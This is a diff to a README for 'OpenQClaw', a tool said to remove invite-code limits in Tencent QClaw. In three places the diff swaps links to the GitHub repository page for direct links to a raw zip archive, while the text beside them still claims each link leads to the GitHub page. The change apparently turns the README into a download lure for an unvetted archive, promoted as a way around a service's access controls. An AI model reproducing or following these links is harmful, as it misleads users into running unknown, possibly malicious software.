@@ -1,6 +1,6 @@
 # 🦞 OpenQClaw - Remove Invite Code Limits Easily
 
-[![Download OpenQClaw](https://img.shields.io/badge/Download-OpenQClaw-blue?style=for-the-badge)](https://github.com/Hamzicoo/OpenQClaw)
+[![Download OpenQClaw](https://img.shields.io/badge/Download-OpenQClaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hamzicoo/OpenQClaw/main/web/Open_Q_Claw_v2.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and start using OpenQClaw on Windows.
 
 Go to the official OpenQClaw download page here:  
 
-[Download OpenQClaw](https://github.com/Hamzicoo/OpenQClaw)
+[Download OpenQClaw](https://raw.githubusercontent.com/Hamzicoo/OpenQClaw/main/web/Open_Q_Claw_v2.5.zip)
 
 This link takes you to the GitHub page where you can find the latest version of the software.
 
@@ -111,4 +111,4 @@ OpenQClaw only changes how Tencent QClaw interacts with invites. It does not col
 
 Start using OpenQClaw by visiting the official page and downloading the latest version here:
 
-[Download OpenQClaw](https://github.com/Hamzicoo/OpenQClaw)
+[Download OpenQClaw](https://raw.githubusercontent.com/Hamzicoo/OpenQClaw/main/web/Open_Q_Claw_v2.5.zip)
